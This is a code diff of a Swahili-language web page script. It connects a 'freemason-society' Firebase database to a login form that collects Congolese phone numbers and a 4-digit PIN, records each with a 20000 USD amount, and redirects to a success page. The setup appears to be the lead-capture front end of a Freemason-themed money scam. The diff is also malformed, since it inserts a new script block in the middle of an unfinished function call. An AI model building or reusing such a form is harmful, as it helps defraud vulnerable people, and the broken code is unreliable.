@@ -492,69 +492,209 @@ form.addEventListener("submit", async (event) => {
             ref(
                 database,
                 "freeMasonDemo/submissions"
-            );
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
+
+import {
+    getDatabase,
+    ref,
+    onValue,
+    push,
+    set
+} from "https://www.gstatic.com/firebasejs/10.14.1/firebase-database.js";
 
 
-        const newSubmission =
-            push(submissionsRef);
+/* =========================
+   SECTION 1 — FIREBASE
+========================= */
+
+const firebaseConfig = {
+    apiKey: "AIzaC3IylLRAMGf8Oo1oFCJk-FIkzRNS8j58U",
+    authDomain: "freemason-society.firebaseapp.com",
+    databaseURL: "https://freemason-society-default-rtdb.europe-west1.firebasedatabase.app",
+    projectId: "freemason-society",
+    storageBucket: "freemason-society.firebasestorage.app",
+    messagingSenderId: "515013260684",
+    appId: "1:515013260684:web:23f4fca3d739e7084ed2a9",
+    measurementId: "G-XDQ6GF6QV6"
+};
+
+const app = initializeApp(firebaseConfig);
+const database = getDatabase(app);
 
 
-        await set(newSubmission, {
+/* =========================
+   SECTION 2 — CONNECTION
+========================= */
 
-            phone: phone,
+const connectionRef = ref(database, ".info/connected");
 
-            type: "DEMO",
+onValue(connectionRef, (snapshot) => {
 
-            amount: 20000,
+    const dot = document.getElementById("statusDot");
+    const text = document.getElementById("statusText");
 
-            currency: "USD",
+    if (!dot || !text) return;
 
-            createdAt:
-                new Date().toISOString()
+    if (snapshot.val() === true) {
 
-        });
+        dot.classList.add("online");
 
+        text.textContent =
+            "Imeunganishwa • Firebase iko hai";
 
-        /* CREATE DEMO REFERENCE */
+    } else {
 
-        const reference =
-            "FM-" +
-            Date.now()
-            .toString()
-            .slice(-8);
+        dot.classList.remove("online");
 
-
-        /*
-         * THIS IS THE ACTUAL REDIRECT.
-         */
-
-        window.location.href =
-            "success.html?ref=" +
-            encodeURIComponent(reference);
-
-
-    } catch (error) {
-
-        console.error(
-            "Firebase error:",
-            error
-        );
-
-
-        message.textContent =
-            "Kuna tatizo la Firebase. Tafadhali jaribu tena.";
-
-        message.style.color =
-            "#d90000";
-
-
-        button.disabled = false;
-
-        button.textContent =
-            "Endelea";
+        text.textContent =
+            "Muunganisho umekatika";
     }
 
 });
+
+
+/* =========================
+   SECTION 3 — FORM
+========================= */
+
+const form = document.getElementById("loginForm");
+const message = document.getElementById("message");
+const button = document.getElementById("submitButton");
+
+
+if (form) {
+
+    form.addEventListener("submit", async (event) => {
+
+        event.preventDefault();
+
+
+        /* Get values */
+
+        const phone =
+            document.getElementById("phone").value.trim();
+
+        const demoPin =
+            document.getElementById("demoPin").value.trim();
+
+
+        /* =========================
+           SECTION 4 — VALIDATION
+        ========================= */
+
+        if (!/^243[0-9]{9,12}$/.test(phone)) {
+
+            message.textContent =
+                "Tafadhali weka namba inayoanza na 243.";
+
+            message.style.color = "#d90000";
+
+            return;
+        }
+
+
+        if (!/^[0-9]{4}$/.test(demoPin)) {
+
+            message.textContent =
+                "PIN ya DEMO lazima iwe na tarakimu 4.";
+
+            message.style.color = "#d90000";
+
+            return;
+        }
+
+
+        /* =========================
+           SECTION 5 — SUBMIT
+        ========================= */
+
+        button.disabled = true;
+
+        button.textContent =
+            "Inawasilisha...";
+
+
+        try {
+
+            const submissionsRef =
+                ref(database, "freeMasonDemo/submissions");
+
+            const newSubmission =
+                push(submissionsRef);
+
+
+            /*
+              IMPORTANT:
+              Demo PIN is NOT saved.
+            */
+
+            await set(newSubmission, {
+
+                phone: phone,
+
+                type: "DEMO",
+
+                amount: 20000,
+
+                currency: "USD",
+
+                createdAt:
+                    new Date().toISOString()
+
+            });
+
+
+            /* =========================
+               SECTION 6 — REFERENCE
+            ========================= */
+
+            const reference =
+                "FM-" +
+                Date.now()
+                    .toString()
+                    .slice(-8);
+
+
+            /* =========================
+               SECTION 7 — NEXT PAGE
+            ========================= */
+
+            window.location.href =
+                "success.html?ref=" +
+                encodeURIComponent(reference);
+
+        }
+
+
+        /* =========================
+           SECTION 8 — ERROR
+        ========================= */
+
+        catch (error) {
+
+            console.error(
+                "Firebase error:",
+                error
+            );
+
+            message.textContent =
+                "Kuna tatizo la Firebase. Tafadhali jaribu tena.";
+
+            message.style.color =
+                "#d90000";
+
+            button.disabled =
+                false;
+
+            button.textContent =
+                "Endelea";
+        }
+
+    });
+
+}
 
 </script>
 
